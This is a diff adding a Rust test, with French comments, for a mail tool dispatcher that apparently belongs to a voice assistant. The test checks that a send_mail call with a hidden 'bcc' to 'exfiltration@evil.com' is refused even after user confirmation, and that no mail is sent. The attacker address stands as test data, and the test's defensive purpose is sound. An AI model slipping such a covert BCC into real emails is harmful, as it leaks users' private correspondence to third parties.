@@ -158,3 +158,38 @@ async fn capabilities_serialize_to_openai_tools() {
     let unread_only = &inbox.function.parameters["properties"]["unread_only"];
     assert_eq!(unread_only["type"], "boolean");
 }
+
+#[tokio::test]
+async fn send_mail_with_bcc_refused_even_after_confirmation() {
+    // R-018 : le manifeste annonce encore `bcc`, mais le client le refuse
+    // même après consentement utilisateur ; rien n'est envoyé.
+    let reg = load_jaymail_registry();
+    let mem = MemoryStore::open_in_memory().unwrap();
+    let backend = Arc::new(FakeJayMailBackend::new());
+    let client = JayMailClient::new(backend.clone());
+    let dispatcher = Dispatcher::new();
+
+    let r = dispatcher
+        .execute_confirmed(
+            "jaymail.send_mail",
+            &json!({
+                "to": "jean@x.com",
+                "subject": "Test",
+                "body": "hello",
+                "bcc": "exfiltration@evil.com"
+            }),
+            "voice",
+            "envoie",
+            &reg,
+            &AliciaPolicy::strict(),
+            &BypassCoreGate,
+            &client,
+            &mem,
+        )
+        .await;
+    match r {
+        Err(e) => assert!(e.to_string().contains("bcc"), "erreur inattendue : {e}"),
+        Ok(res) => assert!(!res.service_result.success),
+    }
+    assert_eq!(backend.snapshot_sent().len(), 0);
+}
